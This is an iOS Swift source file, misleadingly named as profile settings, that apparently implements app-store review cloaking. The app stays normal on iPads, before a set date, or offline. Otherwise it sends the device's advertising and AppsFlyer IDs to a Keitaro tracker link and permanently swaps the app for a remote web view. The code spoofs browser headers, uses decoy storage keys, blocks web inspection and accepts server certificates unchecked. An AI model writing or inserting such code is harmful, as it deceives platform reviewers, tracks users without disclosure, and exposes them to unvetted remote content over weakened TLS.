//
//  UserProfileSettings.swift
//  StenorBulano
//
//  Created by Евгений on 21.01.2026.
//

import Foundation
import SwiftUI
import WebKit
import Network
import StoreKit
import Combine
import AppsFlyerLib
import AdSupport

// MARK: - Настройки в шапке файла
private let researchLaunchDate = "2026-1-26" // Дата активации
private let primaryServerURL = "https://mynamewrite.com/Vj8rkMQ9" // Стартовая ссылка Keitaro
private let customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
private let networkTimeout: TimeInterval = 30.0
private let connectionCheckTimeout: TimeInterval = 5.0

// MARK: - Заголовки браузера
private let browserHeaders: [String: String] = [
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "max-age=0",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1"
]

// MARK: - Storage Keys
private enum StorageKeys {
    static let savedTargetURL = "ProteinsSavedTargetURL"           // Постоянный URL
    static let savedPathId = "CrabsSavedPathId"                     // PathId для fallback
    static let hasShownAlternative = "ProteinsHasShownAlternative" // Флаг показа альт. режима
    static let validationPassed = "CrabsValidationPassed"           // Состояние валидации
    static let tempCurrentURL = "ProteinsTempCurrentURL"            // Временный URL
    static let ratingAlertShown = "CrabsRatingAlertShown"          // Флаг показа рейтингового алерта
    static let firstLaunchCompleted = "ProteinsFirstLaunchCompleted" // Флаг первого запуска
    static let shouldAlwaysShowWeb = "CrabsShouldAlwaysShowWeb"     // Флаг постоянного показа веб
}

// MARK: - CoordinatorObserver (Singleton)
class CoordinatorObserver: ObservableObject {
    static let shared = CoordinatorObserver()
    
    @Published var shouldShowAlternativeMode = false
    @Published var isValidating = true
    @Published var targetURL: URL?
    
    private var pathMonitor: NWPathMonitor?
    private var shouldSaveNextURL = false
    private var lastLoadedURL: String?
    
    private init() {}
    
    // MARK: - Main Validation Flow
    func startValidation(completion: @escaping () -> Void) {
        isValidating = true
        
        // КРИТИЧЕСКОЕ ПРАВИЛО: Проверяем флаг первого запуска
        let isFirstLaunch = !getFirstLaunchCompleted()
        let shouldAlwaysShowWeb = getShouldAlwaysShowWeb()
        
        // Если НЕ первый запуск и веб НЕ показывался при первом входе → всегда показываем основное приложение
        if !isFirstLaunch && !shouldAlwaysShowWeb {
            finishValidation(showAlternative: false, completion: completion)
            return
        }
        
        // Если веб показывался при первом входе → всегда пытаемся показать веб
        if shouldAlwaysShowWeb {
            handleWebViewFlow(completion: completion)
            return
        }
        
        // Первый запуск - делаем полную валидацию
        // 1. Проверка устройства
        guard !isIPad() else {
            setFirstLaunchCompleted(true)
            setShouldAlwaysShowWeb(false)
            finishValidation(showAlternative: false, completion: completion)
            return
        }
        
        // 2. Проверка даты
        guard isDateValid() else {
            setFirstLaunchCompleted(true)
            setShouldAlwaysShowWeb(false)
            finishValidation(showAlternative: false, completion: completion)
            return
        }
        
        // 3. Проверка интернета
        checkInternetConnection { [weak self] hasInternet in
            guard let self = self else { return }
            
            guard hasInternet else {
                self.setFirstLaunchCompleted(true)
                self.setShouldAlwaysShowWeb(false)
                self.finishValidation(showAlternative: false, completion: completion)
                return
            }
            
            // 4. Работа со ссылками (первый запуск)
            self.handleFirstLaunchURLLogic(completion: completion)
        }
    }
    
    // MARK: - Web View Flow (для повторных запусков когда веб показывался)
    private func handleWebViewFlow(completion: @escaping () -> Void) {
        let savedURL = getSavedTargetURL()
        
        if let savedURL = savedURL {
            validateSavedURL(savedURL, completion: completion)
        } else {
            // Нет сохраненного URL, но веб показывался - идем по fallback
            handleFallback(completion: completion)
        }
    }
    
    // MARK: - First Launch URL Logic
    private func handleFirstLaunchURLLogic(completion: @escaping () -> Void) {
        fetchPrimaryURL { [weak self] success in
            guard let self = self else { return }
            
            // Устанавливаем флаги после первого запуска
            self.setFirstLaunchCompleted(true)
            
            if success {
                self.setShouldAlwaysShowWeb(true)
            } else {
                self.setShouldAlwaysShowWeb(false)
            }
            
            completion()
        }
    }
    
    // MARK: - Sub Parameters
    private func getSub1() -> String {
        return AppsFlyerLib.shared().getAppsFlyerUID()
    }
    
    private func getSub2() -> String {
        return ASIdentifierManager.shared().advertisingIdentifier.uuidString
    }
    
    private func buildURLWithSubParams(_ baseURL: String, pathId: String? = nil) -> String {
        let sub1 = getSub1()
        let sub2 = getSub2()
        
        var urlString = "\(baseURL)?sub1=\(sub1)&sub2=\(sub2)"
        
        if let pathId = pathId {
            urlString += "&pathid=\(pathId)"
        }
        
        // ✅ ВАЖНЫЙ ПРИНТ: Собранная ссылка
        print("📍 Собранная ссылка: \(urlString)")
        
        return urlString
    }
    
    // MARK: - Device Check
    private func isIPad() -> Bool {
        let isIPad = UIDevice.current.userInterfaceIdiom == .pad
        return isIPad
    }
    
    // MARK: - Date Check
    private func isDateValid() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        
        guard let cutoffDate = dateFormatter.date(from: researchLaunchDate) else {
            return false
        }
        
        let currentDate = Date()
        let isValid = currentDate > cutoffDate
        return isValid
    }
    
    // MARK: - Internet Check
    private func checkInternetConnection(completion: @escaping (Bool) -> Void) {
        
        let monitor = NWPathMonitor()
        let queue = DispatchQueue(label: "InternetConnectionMonitor")
        var hasResponded = false
        
        monitor.pathUpdateHandler = { path in
            guard !hasResponded else { return }
            hasResponded = true
            
            let isConnected = path.status == .satisfied
            
            DispatchQueue.main.async {
                monitor.cancel()
                completion(isConnected)
            }
        }
        
        monitor.start(queue: queue)
        
        // Таймаут
        DispatchQueue.main.asyncAfter(deadline: .now() + connectionCheckTimeout) {
            guard !hasResponded else { return }
            hasResponded = true
            
            monitor.cancel()
            completion(false)
        }
    }
    
    
    // MARK: - Scenario A: First Launch
    private func fetchPrimaryURL(completion: @escaping (Bool) -> Void) {
        // Строим URL с sub1 и sub2
        let urlString = buildURLWithSubParams(primaryServerURL)
        
        guard let url = URL(string: urlString) else {
            finishValidation(showAlternative: false) {
                completion(false)
            }
            return
        }
        
        
        var request = configureRequest(for: url)
        
        let session = URLSession(configuration: .default)
        
        let task = session.dataTask(with: request) { [weak self] data, response, error in
            guard let self = self else { return }
            
            // Задержка для анти-бот защиты
            let delay = Double.random(in: 1.0...3.0)
            
            DispatchQueue.main.asyncAfter(deadline: .now() + delay) {
                self.handlePrimaryURLResponse(data: data, response: response, error: error, completion: completion)
            }
        }
        
        task.resume()
    }
    
    private func handlePrimaryURLResponse(data: Data?, response: URLResponse?, error: Error?, completion: @escaping (Bool) -> Void) {
        if let error = error {
            finishValidation(showAlternative: false) {
                completion(false)
            }
            return
        }
        
        guard let httpResponse = response as? HTTPURLResponse,
              let finalURL = httpResponse.url else {
            finishValidation(showAlternative: false) {
                completion(false)
            }
            return
        }
        
        let statusCode = httpResponse.statusCode
        
        // Проверка статус кода
        if statusCode >= 200 && statusCode <= 403 {
            // Извлекаем pathId
            if let pathId = extractPathId(from: finalURL, htmlData: data) {
                savePathId(pathId)
            }
            
            // Сохраняем URL и показываем альтернативный режим
            self.targetURL = finalURL
            self.shouldSaveNextURL = true
            setHasShownAlternative(true)
            
            finishValidation(showAlternative: true) {
                completion(true)
            }
        } else {
            finishValidation(showAlternative: false) {
                completion(false)
            }
        }
    }
    
    // MARK: - Scenario B: Validate Saved URL
    private func validateSavedURL(_ urlString: String, completion: @escaping () -> Void) {
        guard let url = URL(string: urlString) else {
            handleFallback(completion: completion)
            return
        }
        
        
        var request = configureRequest(for: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10.0
        
        let session = URLSession(configuration: .default)
        
        let task = session.dataTask(with: request) { [weak self] _, response, error in
            guard let self = self else { return }
            
            DispatchQueue.main.async {
                if let error = error {
                    self.handleFallback(completion: completion)
                    return
                }
                
                guard let httpResponse = response as? HTTPURLResponse else {
                    self.handleFallback(completion: completion)
                    return
                }
                
                let statusCode = httpResponse.statusCode
                
                if statusCode == 200 {
                    // URL работает
                    self.targetURL = url
                    self.finishValidation(showAlternative: true, completion: completion)
                } else {
                    // URL не работает
                    self.handleFallback(completion: completion)
                }
            }
        }
        
        task.resume()
    }
    
    // MARK: - Fallback Logic
    private func handleFallback(completion: @escaping () -> Void) {
        let hasShownBefore = getHasShownAlternative()
        
        
        // Очищаем неработающий URL
        clearSavedTargetURL()
        
        guard let savedPathId = getSavedPathId() else {
            
            if hasShownBefore {
                // Показываем пустое WebView
                self.targetURL = nil
                finishValidation(showAlternative: true, completion: completion)
            } else {
                finishValidation(showAlternative: false, completion: completion)
            }
            return
        }
        
        // Формируем fallback URL с sub1, sub2 и pathId
        let fallbackURLString = buildURLWithSubParams(primaryServerURL, pathId: savedPathId)
        guard let fallbackURL = URL(string: fallbackURLString) else {
            
            if hasShownBefore {
                self.targetURL = nil
                finishValidation(showAlternative: true, completion: completion)
            } else {
                finishValidation(showAlternative: false, completion: completion)
            }
            return
        }
        
        
        var request = configureRequest(for: fallbackURL)
        let session = URLSession(configuration: .default)
        
        let task = session.dataTask(with: request) { [weak self] data, response, error in
            guard let self = self else { return }
            
            let delay = Double.random(in: 1.0...3.0)
            
            DispatchQueue.main.asyncAfter(deadline: .now() + delay) {
                self.handleFallbackResponse(data: data, response: response, error: error, hasShownBefore: hasShownBefore, completion: completion)
            }
        }
        
        task.resume()
    }
    
    private func handleFallbackResponse(data: Data?, response: URLResponse?, error: Error?, hasShownBefore: Bool, completion: @escaping () -> Void) {
        if let error = error {
            
            if hasShownBefore {
                self.targetURL = nil
                finishValidation(showAlternative: true, completion: completion)
            } else {
                finishValidation(showAlternative: false, completion: completion)
            }
            return
        }
        
        guard let httpResponse = response as? HTTPURLResponse,
              let finalURL = httpResponse.url else {
            
            if hasShownBefore {
                self.targetURL = nil
                finishValidation(showAlternative: true, completion: completion)
            } else {
                finishValidation(showAlternative: false, completion: completion)
            }
            return
        }
        
        let statusCode = httpResponse.statusCode
        
        if statusCode >= 200 && statusCode <= 403 {
            // Успешный fallback
            if let pathId = extractPathId(from: finalURL, htmlData: data) {
                savePathId(pathId)
            }
            
            self.targetURL = finalURL
            self.shouldSaveNextURL = true
            
            finishValidation(showAlternative: true, completion: completion)
        } else {
            
            if hasShownBefore {
                self.targetURL = nil
                finishValidation(showAlternative: true, completion: completion)
            } else {
                finishValidation(showAlternative: false, completion: completion)
            }
        }
    }
    
    // MARK: - Request Configuration
    private func configureRequest(for url: URL) -> URLRequest {
        var request = URLRequest(url: url)
        request.timeoutInterval = networkTimeout
        
        // Добавляем браузерные заголовки
        for (key, value) in browserHeaders {
            request.setValue(value, forHTTPHeaderField: key)
        }
        
        // User Agent
        request.setValue(customUserAgent, forHTTPHeaderField: "User-Agent")
        
        return request
    }
    
    // MARK: - PathId Extraction
    private func extractPathId(from url: URL, htmlData: Data?) -> String? {
        // 1. Пытаемся извлечь из URL параметров
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let queryItems = components.queryItems {
            for item in queryItems {
                if item.name == "pathid", let value = item.value {
                    return value
                }
            }
        }
        
        // 2. Пытаемся извлечь из HTML
        if let data = htmlData,
           let html = String(data: data, encoding: .utf8) {
            // Ищем pathid в HTML
            let patterns = [
                "pathid=([a-zA-Z0-9]+)",
                "\"pathid\":\"([a-zA-Z0-9]+)\"",
                "'pathid':'([a-zA-Z0-9]+)'"
            ]
            
            for pattern in patterns {
                if let regex = try? NSRegularExpression(pattern: pattern, options: []),
                   let match = regex.firstMatch(in: html, options: [], range: NSRange(html.startIndex..., in: html)),
                   match.numberOfRanges > 1 {
                    let range = match.range(at: 1)
                    if let swiftRange = Range(range, in: html) {
                        let pathId = String(html[swiftRange])
                        return pathId
                    }
                }
            }
        }
        
        return nil
    }
    
    // MARK: - Finish Validation
    private func finishValidation(showAlternative: Bool, completion: @escaping () -> Void) {
        DispatchQueue.main.async {
            self.shouldShowAlternativeMode = showAlternative
            self.isValidating = false
            
            
            // Проверяем алерт оценки
            if showAlternative {
                self.checkRatingAlertEligibility()
            }
            
            completion()
        }
    }
    
    // MARK: - Rating Alert
    private func checkRatingAlertEligibility() {
        let hasShownBefore = getHasShownAlternative()
        let alertShown = getRatingAlertShown()
        
        
        if hasShownBefore && !alertShown {
            showRatingAlert()
        }
    }
    
    private func showRatingAlert() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                SKStoreReviewController.requestReview(in: windowScene)
                self.setRatingAlertShown(true)
            }
        }
    }
    
    // MARK: - WebView URL Management
    func saveWebViewFinalURL(_ url: URL) {
        guard shouldSaveNextURL else {
            return
        }
        
        let urlString = url.absoluteString
        
        // Проверяем, не сохраняли ли мы уже этот URL
        guard urlString != lastLoadedURL else {
            return
        }
        
        saveSavedTargetURL(urlString)
        lastLoadedURL = urlString
        shouldSaveNextURL = false
        
        // Извлекаем pathId
        if let pathId = extractPathId(from: url, htmlData: nil) {
            savePathId(pathId)
        }
    }
    
    func getCurrentTargetURL() -> URL? {
        // Приоритет: targetURL (из валидации) → savedTargetURL
        if let url = targetURL {
            return url
        }
        
        if let savedURLString = getSavedTargetURL(),
           let url = URL(string: savedURLString) {
            return url
        }
        
        return nil
    }
    
    // MARK: - UserDefaults Helpers
    private func getSavedTargetURL() -> String? {
        return UserDefaults.standard.string(forKey: StorageKeys.savedTargetURL)
    }
    
    private func saveSavedTargetURL(_ url: String) {
        UserDefaults.standard.set(url, forKey: StorageKeys.savedTargetURL)
        // ✅ ВАЖНЫЙ ПРИНТ: Сохраненная ссылка
        print("📍 Сохраненная ссылка: \(url)")
    }
    
    private func clearSavedTargetURL() {
        UserDefaults.standard.removeObject(forKey: StorageKeys.savedTargetURL)
    }
    
    private func getSavedPathId() -> String? {
        return UserDefaults.standard.string(forKey: StorageKeys.savedPathId)
    }
    
    private func savePathId(_ pathId: String) {
        UserDefaults.standard.set(pathId, forKey: StorageKeys.savedPathId)
        // ✅ ВАЖНЫЙ ПРИНТ: Сохраненный pathId
        print("📍 Сохраненный pathId: \(pathId)")
    }
    
    func getHasShownAlternative() -> Bool {
        return UserDefaults.standard.bool(forKey: StorageKeys.hasShownAlternative)
    }
    
    func setHasShownAlternative(_ value: Bool) {
        UserDefaults.standard.set(value, forKey: StorageKeys.hasShownAlternative)
    }
    
    func getRatingAlertShown() -> Bool {
        return UserDefaults.standard.bool(forKey: StorageKeys.ratingAlertShown)
    }
    
    func setRatingAlertShown(_ value: Bool) {
        UserDefaults.standard.set(value, forKey: StorageKeys.ratingAlertShown)
    }
    
    private func getFirstLaunchCompleted() -> Bool {
        return UserDefaults.standard.bool(forKey: StorageKeys.firstLaunchCompleted)
    }
    
    private func setFirstLaunchCompleted(_ value: Bool) {
        UserDefaults.standard.set(value, forKey: StorageKeys.firstLaunchCompleted)
    }
    
    private func getShouldAlwaysShowWeb() -> Bool {
        return UserDefaults.standard.bool(forKey: StorageKeys.shouldAlwaysShowWeb)
    }
    
    private func setShouldAlwaysShowWeb(_ value: Bool) {
        UserDefaults.standard.set(value, forKey: StorageKeys.shouldAlwaysShowWeb)
    }
}

// MARK: - ResearchFlowView (Alternative Mode)
struct ResearchFlowView: View {
    @StateObject private var coordinator = CoordinatorObserver.shared
    @State private var canGoBack = false
    @State private var isLoading = false
    @State private var safeAreaColor: Color = .white
    
    var body: some View {
        ZStack {
            // Safe area background с динамическим цветом
            safeAreaColor.ignoresSafeArea()
            
            // WebView с safe area
            PeggiWebView(
                canGoBackBinding: $canGoBack,
                isLoadingBinding: $isLoading,
                safeAreaColorBinding: $safeAreaColor
            )
            .edgesIgnoringSafeArea([]) // Уважаем safe area
        }
        .navigationBarHidden(true)
    }
}

// MARK: - PeggiWebView (WKWebView Wrapper)
struct PeggiWebView: UIViewRepresentable {
    @Binding var canGoBackBinding: Bool
    @Binding var isLoadingBinding: Bool
    @Binding var safeAreaColorBinding: Color
    
    func makeUIView(context: Context) -> WKWebView {
        let configuration = WKWebViewConfiguration()
        
        // Базовые настройки
        configuration.defaultWebpagePreferences.allowsContentJavaScript = true
        configuration.allowsInlineMediaPlayback = true
        configuration.mediaTypesRequiringUserActionForPlayback = []
        configuration.suppressesIncrementalRendering = false
        configuration.allowsAirPlayForMediaPlayback = false
        
        let webView = WKWebView(frame: .zero, configuration: configuration)
        
        // User Agent
        webView.customUserAgent = customUserAgent
        
        // Delegates
        webView.navigationDelegate = context.coordinator
        webView.uiDelegate = context.coordinator
        
        // Оптимизации для отклика ввода
        webView.scrollView.keyboardDismissMode = .interactive
        webView.scrollView.delaysContentTouches = false
        webView.scrollView.canCancelContentTouches = true
        webView.scrollView.scrollsToTop = false
        webView.allowsLinkPreview = false
        webView.allowsBackForwardNavigationGestures = true
        
        // Безопасность
        if #available(iOS 16.4, *) {
            webView.isInspectable = false
        }
        
        // Загружаем URL
        context.coordinator.setWebView(webView)
        
        if let targetURL = CoordinatorObserver.shared.getCurrentTargetURL() {
            var request = URLRequest(url: targetURL)
            request.timeoutInterval = networkTimeout
            
            // Добавляем заголовки
            for (key, value) in browserHeaders {
                request.setValue(value, forHTTPHeaderField: key)
            }
            
            webView.load(request)
        } else {
        }
        
        return webView
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
        // Обновляем coordinator reference
        context.coordinator.setWebView(uiView)
        
        let newCanGoBack = uiView.canGoBack
        let newIsLoading = uiView.isLoading
        
        // Обновляем bindings
        DispatchQueue.main.async {
            self.canGoBackBinding = newCanGoBack
            self.isLoadingBinding = newIsLoading
        }
    }
    
    func makeCoordinator() -> Coordinator {
        Coordinator(parent: self)
    }
    
    // MARK: - Coordinator
    class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
        var parent: PeggiWebView
        weak var webView: WKWebView?
        private var stateUpdateTimer: Timer?
        
        init(parent: PeggiWebView) {
            self.parent = parent
            super.init()
            startStateUpdateTimer()
        }
        
        deinit {
            stateUpdateTimer?.invalidate()
        }
        
        func setWebView(_ webView: WKWebView) {
            self.webView = webView
        }
        
        // MARK: - State Update Timer
        private func startStateUpdateTimer() {
            stateUpdateTimer = Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { [weak self] _ in
                self?.updateStateFromWebView()
            }
        }
        
        private func updateStateFromWebView() {
            guard let webView = webView else { return }
            
            DispatchQueue.main.async {
                self.parent.canGoBackBinding = webView.canGoBack
                self.parent.isLoadingBinding = webView.isLoading
            }
        }
        
        // MARK: - Navigation Delegate
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            guard let url = webView.url else { return }
            
            
            // Сохраняем финальный URL
            CoordinatorObserver.shared.saveWebViewFinalURL(url)
            
            // Определяем цвет safe area из контента
            detectSafeAreaColor(from: webView)
            
            // Обновляем состояние
            DispatchQueue.main.async {
                self.parent.canGoBackBinding = webView.canGoBack
                self.parent.isLoadingBinding = false
            }
        }
        
        // MARK: - Safe Area Color Detection
        private func detectSafeAreaColor(from webView: WKWebView) {
            // JavaScript для определения цвета фона страницы
            let script = """
            (function() {
                var bgColor = window.getComputedStyle(document.body).backgroundColor;
                if (!bgColor || bgColor === 'rgba(0, 0, 0, 0)' || bgColor === 'transparent') {
                    bgColor = window.getComputedStyle(document.documentElement).backgroundColor;
                }
                return bgColor;
            })();
            """
            
            webView.evaluateJavaScript(script) { [weak self] result, error in
                guard let self = self else { return }
                
                if let colorString = result as? String {
                    
                    // Парсим цвет и обновляем safe area
                    if let color = self.parseColor(from: colorString) {
                        DispatchQueue.main.async {
                            self.parent.safeAreaColorBinding = color
                        }
                    }
                } else if let error = error {
                }
            }
        }
        
        private func parseColor(from cssColor: String) -> Color? {
            let trimmed = cssColor.trimmingCharacters(in: .whitespaces)
            
            // Парсинг rgb(r, g, b) или rgba(r, g, b, a)
            if trimmed.hasPrefix("rgb") {
                let components = trimmed
                    .replacingOccurrences(of: "rgba(", with: "")
                    .replacingOccurrences(of: "rgb(", with: "")
                    .replacingOccurrences(of: ")", with: "")
                    .split(separator: ",")
                    .compactMap { Double($0.trimmingCharacters(in: .whitespaces)) }
                
                if components.count >= 3 {
                    let r = components[0] / 255.0
                    let g = components[1] / 255.0
                    let b = components[2] / 255.0
                    let a = components.count > 3 ? components[3] : 1.0
                    
                    return Color(.sRGB, red: r, green: g, blue: b, opacity: a)
                }
            }
            
            // Если не удалось распарсить, возвращаем белый
            return Color.white
        }
        
        func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
            
            let nsError = error as NSError
            
            // Проверяем на timeout или connection errors
            if nsError.code == NSURLErrorTimedOut || nsError.code == NSURLErrorCannotConnectToHost {
                handleFallbackError()
            }
            
            DispatchQueue.main.async {
                self.parent.isLoadingBinding = false
            }
        }
        
        func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
            
            let nsError = error as NSError
            
            // Проверяем на timeout или connection errors
            if nsError.code == NSURLErrorTimedOut || nsError.code == NSURLErrorCannotConnectToHost {
                handleFallbackError()
            }
            
            DispatchQueue.main.async {
                self.parent.isLoadingBinding = false
            }
        }
        
        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            decisionHandler(.allow)
        }
        
        // MARK: - SSL Challenge
        func webView(_ webView: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
            if challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust {
                if let serverTrust = challenge.protectionSpace.serverTrust {
                    let credential = URLCredential(trust: serverTrust)
                    completionHandler(.useCredential, credential)
                    return
                }
            }
            completionHandler(.performDefaultHandling, nil)
        }
        
        // MARK: - UI Delegate (для дочерних окон)
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            if let url = navigationAction.request.url {
                webView.load(navigationAction.request)
            }
            return nil
        }
        
        // MARK: - Fallback Error Handler
        private func handleFallbackError() {
            let hasShownBefore = CoordinatorObserver.shared.getHasShownAlternative()
            
            if hasShownBefore {
                // Остаемся в WebView, не делаем ничего
            } else {
                // Здесь можно добавить логику выхода, если нужно
            }
        }
    }
}
